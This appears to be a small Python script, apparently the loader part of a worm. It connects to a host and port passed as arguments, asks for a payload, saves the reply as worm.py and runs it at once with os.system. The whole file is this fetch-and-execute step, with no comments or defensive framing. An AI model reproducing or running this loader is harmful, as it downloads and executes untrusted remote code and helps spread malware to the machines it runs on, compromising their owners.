import socket
import os
import sys

host = sys.argv[1]
port = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(b'give your py to me')
data = s.recv(1024)

with open("worm.py", "w") as file:
    file.write(data.decode())
os.system("python3 worm.py")

s.close()
